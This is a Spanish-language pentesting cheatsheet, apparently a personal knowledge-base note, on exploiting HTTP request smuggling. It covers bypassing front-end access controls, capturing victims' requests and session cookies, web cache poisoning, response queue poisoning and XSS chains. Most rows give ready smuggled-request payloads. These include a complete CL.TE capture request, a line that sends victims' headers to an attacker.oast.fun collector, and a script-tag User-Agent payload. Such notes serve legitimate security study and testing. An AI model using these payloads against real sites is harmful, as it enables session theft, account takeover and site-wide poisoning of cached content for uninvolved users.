---
aliases:
  - HRS Exploitation
  - Smuggling Impact
  - Cache Poisoning Smuggle
  - Queue Poisoning
tags:
  - type/cheatsheet
  - vuln/http-smuggling
  - technique/initial-access
  - technique/credential-access
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Request Smuggling]]'
  - '[[Cross-Site Scripting (XSS)]]'
---
# HTTP Request Smuggling - Explotación

***

## Bypass de Front-end Controls

| **Objetivo** | **Smuggled request** | **Resultado** |
|:---:|:---:|:---:|
| Bypass auth check | `GET /admin HTTP/1.1\r\nHost: target\r\n\r\n` | Front valida session en `/`, smuggled `/admin` ya pasó por front. |
| Bypass IP allowlist | Smuggle `GET /admin` cuando front filtra `/admin` por IP | Backend recibe sin filtros del front. |
| Bypass WAF rules | Smuggle SQLi/XSS payload que WAF bloquea en path normal | WAF en front no ve smuggled (queda en buffer). |
| Bypass rate limit | Múltiples requests dentro de uno smuggled | Rate limiter cuenta solo el outer request. |
| Bypass header injection blocking | Inyectar headers que front filtra (`X-Forwarded-For`, `X-Real-IP`) | Si back trustea esos headers de internal hops. |
| Bypass por path | `GET /private/data HTTP/1.1` | Endpoints internos. |
| Bypass por método | `PUT /admin/config HTTP/1.1` | Métodos restringidos por front. |
| Bypass cliente cert | Smuggle request que no pasa mTLS check | Si TLS termina en front. |
| Acceder API interna | `GET /api/internal/users HTTP/1.1\r\nHost: internal-api.local\r\n\r\n` | Cambiar Host para alcanzar virtual host interno. |
| Reach localhost endpoints | `GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n` | Si back routea por Host header. |
^hrs-exploit-bypass

___

## Request Capture / Hijack

| **Objetivo** | **Payload** | **Resultado** |
|:---:|:---:|:---:|
| Capturar próxima request user | Smuggle request con body grande + `Content-Length` muy largo | Próxima request del user concatena al body smuggleado → atacante recibe en log endpoint. |
| Setup endpoint logger | Smuggle `POST /comment HTTP/1.1\r\nHost: target\r\nContent-Length: 1000\r\n\r\n` | Body capturará 1000 bytes de la próxima victim request (incluyendo cookies / Authorization). |
| Steal cookie victim | Smuggle pega `Cookie: session=...` (de victim) en endpoint público (comment / search) | Aparece en página visible. |
| Steal Authorization header | Smuggle a endpoint reflective | Atacante lee response. |
| Steal body POST victim | Si victim manda POST con creds, smuggle captura | Funciona para login forms. |
| Sobre XHR / CSRF tokens | Smuggle hace que próxima request del user sea reflejada con token incluido | Hijack token. |
| Burp Collaborator log | Smuggle `POST /attacker.oast.fun/log HTTP/1.1\r\nContent-Length: 1024\r\n\r\n` | Captura headers de víctimas en Collaborator. |
| Length para captura | Calcular CL para alcanzar Cookie/Auth típicos (~500-1500 bytes) | Si muy chico → cortado, si muy largo → timeout. |
^hrs-exploit-capture

### Setup completo capture

```http
[Outer request CL.TE]
POST / HTTP/1.1
Host: target.com
Content-Length: 297
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=
```

Después de smuggle, próxima request del user se concatena al `comment=` form. Si user manda `GET /home HTTP/1.1\r\nCookie: session=abc...\r\n\r\n` → todo eso queda como valor del comment → atacante lo ve público en `/comments`.

___

## Web Cache Poisoning vía Smuggle

| **Objetivo** | **Payload** | **Resultado** |
|:---:|:---:|:---:|
| Concepto | Smuggle response de path X que cachea response de path Y | Cache asocia URL víctima a contenido controlado. |
| Setup | Smuggle `GET / HTTP/1.1\r\nHost: target\r\n\r\n` | Próxima request user a `/static/js/app.js` recibe response del smuggle (que era para `/`). Cache key = `/static/js/app.js` con contenido de `/`. |
| Chain con XSS reflejado | Smuggle a endpoint con XSS en query → response con XSS cacheada como `/index.html` | Persistent XSS sin auth. |
| Chain con redirect controlado | Smuggle a endpoint con redirect open | Cache redirect malicioso. |
| Chain con error custom | Smuggle a `/notfound` → response con HTML controlado | Cache error page hostil. |
| Combine Vary header | Si cache respeta `Vary: User-Agent` etc — bypass via consistent UA | Cache hit fiable. |
| TTL del cache | Cache poisoning persiste segundos a horas según TTL | Más impacto = TTL largo. |
| Combine con web cache deception | Smuggle + path confusion | Stack vector. |
^hrs-exploit-cache

___

## Response Queue Poisoning

| **Objetivo** | **Payload** | **Resultado** |
|:---:|:---:|:---:|
| Concepto | Smuggle desincroniza queue de responses → atacante recibe response destinada a victim | Permanent desync — back-end conn nunca se recupera. |
| Mecanismo | Smuggle 2 requests dentro de 1 → back genera 2 responses → front leyó solo 1 → siguiente response queda asociada a próxima request | Atacante hace request normal + recibe response de víctima. |
| Setup multi-request smuggle | Smuggle `GET / + GET /` (2 requests) | Genera 2 responses extras en queue. |
| Trigger timing | Atacante manda request y monitorea responses raras | Recibe response con cookies de otro user. |
| Burp Repeater queue | "Send group → in single connection" | Reproducible con setup correcto. |
| HTTP/2 queue poison | H2 multiplexing dificulta — pero downgrade a H1 reaviva el vector | Combine con H2.CL/H2.TE. |
| Persistencia | Una vez desyncado, conn queda permanente desyncada hasta close | Loop de robos. |
| Steal credentials | Si victim hace login → response del login (con cookie set) llega al atacante | Account takeover automático. |
^hrs-exploit-queue

### Stylesheet response queue poison

```
[Atacante envía smuggle multi-request]
POST / HTTP/1.1 (+ smuggled GET / GET /)

[Back-end genera 3 responses para 1 request del front]
[Front-end devuelve 1 al atacante]
[2 responses extras quedan en queue]

[Victim hace GET /home]
[Front-end le devuelve la response que sobró del atacante = posiblemente con cookie del último user]
[Próximas víctimas reciben responses corridas]
```

___

## Reflected XSS Chain via Smuggling

| **Objetivo** | **Payload** | **Resultado** |
|:---:|:---:|:---:|
| Concepto | Smuggle request con XSS reflejada en User-Agent → response cacheada con script | Persistent XSS sin necesidad de social engineering. |
| Setup | Smuggle `GET / HTTP/1.1\r\nUser-Agent: <script>alert(1)</script>\r\nHost: target\r\n\r\n` | Si app refleja UA en response y cache la guarda. |
| Bypass de UA filter | UA con XSS payload escapa filtros aplicados solo a query params | App suele no filtrar headers. |
| Combine con cache poison | Smuggle response cacheada como `/index.html` | Todo user ve XSS. |
| XSS to ATO | XSS en autenticated context → robar cookies → ATO | Chain completo. |
| Stored-via-smuggle | Smuggle a endpoint que persiste el body (comments) | Persistent sin necesidad de cache. |
| HTML injection sin XSS | Smuggle inyecta `<meta refresh>` en response | Phishing redirect. |
| Web cache deception combo | Smuggle + path traversal en cache | Persiste con TTL largo. |
^hrs-exploit-xss

***
